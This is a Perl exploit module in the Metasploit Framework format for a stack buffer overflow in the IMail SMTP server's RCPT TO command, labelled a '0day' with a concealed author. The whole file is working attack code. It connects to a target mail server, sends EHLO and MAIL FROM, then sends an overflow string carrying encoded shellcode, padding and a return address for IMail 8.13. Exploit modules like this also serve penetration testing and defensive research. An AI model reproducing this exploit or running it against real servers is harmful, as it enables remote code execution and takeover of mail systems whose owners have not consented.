
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::imail_smtp_rcpt;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = {
};

my $info = {
  'Name'    => 'IMail SMTP RCPT Overflow, 0day!',
  'Version'  => '$Revision$',
  'Authors' => [ 'sshhh!', ],
  'Arch'    => [ 'x86' ],
  'OS'      => [ 'win32'],
  'Priv'    => 1, 
  'AutoOpts'  =>
    {
      'EXITFUNC'  => 'thread',
    },
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The target port', 25],
    },
  'Payload' =>
    {
      # give some stack space, align esp
      'Prepend'   => "\x8b\x7d\x04\x81\xec\x96\x40\x00\x00\x66\x81\xe4\xf0\xff",
      'Space'     => 548,
      'BadChars'  => "><\x00\x20@:\r\n",
      'MinNops'   => 0,
      'MaxNops'   => 0,
      'Keys'      => [ '+findedi' ],
    },
  'Encoder' =>
    {
    },
  'Description'  => Pex::Text::Freeform(qq{
      Shhhh!
      
    }),
  'Refs'  =>
    [
      '',
    ],
  'DefaultTarget' => -1,
  'Targets' =>
    [
      # alphanum rets :(, will look more into it later
      ['Version 8.13 EVAL', "\x18\x1a"], # -> 0x00401a18
#      ['Version 8.05 EVAL', "\xca\x19"], # -> 0x004019ca
#      ['CRASH', "AAA"], # -> 0x40414141
    ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

  return($self);
}

sub Exploit {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $encodedPayload = $self->GetVar('EncodedPayload');
  my $shellcode   = $encodedPayload->Payload;
  my $target = $self->Targets->[$targetIndex];

  $shellcode .= 'A' x ($self->PayloadSpace - length($shellcode));

  my $sock = Msf::Socket::Tcp->new(
    'PeerAddr' => $targetHost,
    'PeerPort' => $targetPort,
  );
  if($sock->IsError) {
    $self->PrintLine('Error creating socket: ' . $sock->GetError);
    return;
  }

  my $resp = $sock->Recv(-1);
  chomp($resp);
  $self->PrintLine('[*] Got Banner: ' . $resp);

  my $evil = "EHLO host\r\n";
  $sock->Send($evil);
  my $resp = $sock->Recv(-1);
  if($sock->IsError) {
    $self->PrintLine('Socket error: ' . $sock->GetError);
    return;
  }
  if($resp !~ /^250/) {
    $self->PrintLine('ehlo error: ' . $resp);
    return;
  }
  $sock->Send("MAIL FROM: a\@b.com\r\n");
  $self->PrintLine('[*] sending overflow');

  $evil = 'RCPT TO: <@:' . $shellcode;
  $evil .= $target->[1] . ">\r\n";

  # hopefully this works...
  $sock->Send($evil);

  my $resp = $sock->Recv(-1);
  if(length($resp)) {
    $self->PrintLine('[*] Got response, bad: ' . $resp);
  }


  return;
}

1;
